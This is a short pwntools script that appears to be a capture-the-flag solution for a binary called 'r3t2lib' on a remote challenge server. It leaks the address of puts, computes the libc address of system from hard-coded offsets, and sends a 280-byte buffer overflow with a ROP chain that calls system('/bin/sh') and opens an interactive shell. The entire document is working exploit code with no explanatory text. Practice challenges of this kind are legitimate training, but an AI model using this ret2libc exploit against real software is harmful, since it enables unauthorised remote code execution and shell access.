from pwn import *

context.arch = "amd64"

puts_got = "601018" 
pop_rdi = 0x400843
sh = 0x4003c4

#r = process('./r3t2lib')
r = remote('pwnhub.tw', 8088)
r.recvuntil(':')
r.send(puts_got)
r.recvuntil(':')
puts_addr = int(r.recvuntil('\n').strip(),16)
system_addr = puts_addr - 0x6f690 + 0x45390
r.recvuntil(':')
payload = 'A' * 280 + flat([pop_rdi,sh,system_addr])
r.send(payload)
r.interactive()
